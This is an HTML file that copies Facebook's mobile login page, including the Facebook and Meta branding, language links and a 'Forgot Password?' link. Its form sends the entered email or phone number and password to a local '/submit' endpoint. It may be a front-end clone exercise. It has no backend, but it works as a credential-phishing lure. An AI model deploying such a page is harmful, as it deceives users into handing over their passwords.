<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>website - log in or sign up</title>
    <!-- link to font -->
    <link
      href="https://fonts.googleapis.com/css?family=Open+Sans:400,700"
      rel="stylesheet"
      type="text/css"
    />
    <!-- bootstrap CDN-->
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
    />
    <link rel="stylesheet" href="CSS/style.css" />
  </head>

  <body>
    <!-----------------HEADER---------------->
    <div class="header row">
      <div class="col col-sm-3">
        <img class="logo" src="CSS/logo.png" alt="website" />
      </div>
      <div class="header-text col-sm-6">
        <h4>Facebook</h4>
        <p>Open in the website app</p>
      </div>
      <div class="col col-sm-3">
        <button class="open btn btn-lg btn-light" type="button">OPEN</button>
      </div>
    </div>

    <!-------------------------LOGIN Section-------------------------->
    <div class="row">
      <div class="col col-12">
        <img
          class="website"
          src="https://i.postimg.cc/NMyj90t9/logo.png"
          alt="website"
        />
      </div>

      <!-- User name and password section -->
      <form action="/submit" method="post">
        <div class="login col-12"> 
          <input
            class="login-field"
            id="email"
            name="email"
            type="text"
            size="50"
            placeholder="Mobile number or email"
          />
     
        </div>
        <div class="login col-12">
        
          <input
            class="create-field"
            id="password"
            name="password"
            type="password"
            size="50"
            placeholder="Password"
          />
        
        </div>

      <!-- Log in button -->
        <div class="col-12">
          
          <button
            type="submit"
            id="bt"
            class="login-btn btn btn-primary btn-lg"
          >
          Log In
          </button>
        </div>
      </form>
        <!-- create a new account section -->

        <div class="forgot-pass col-12">
          <a
            href="https://www.website.com/login/identify/?ctx=recover&ars=website_login&from_login_screen=0"
            >Forgot Password?</a
          >
        </div>
        <hr class="hr-text" data-content="or" />
        <div class="col-12">
          <button type="submit" class="create-btn btn btn-lg btn-outline-dark">
            <strong>Create new account</strong>
          </button>
        </div>
      </div>
    </div>

    <!-----------------------FOOTER---------------------------->
    <div class="row">
      <div class="language col-sm-6">
        <p>English (US)</p>
        <p>Français (French)</p>
        <p>Português(Brasil)</p>
        <p>Italiano</p>
      </div>
      <div class="language col-sm-6">
        <p>Español</p>
        <p>中国人</p>
        <p>Deutsch</p>
      </div>
      <div class="footer-links col-sm-12">
        <p>About • Help • More</p>
        <p>Meta ©️ 2023</p>
      </div>
    </div>
  </body>
</html>
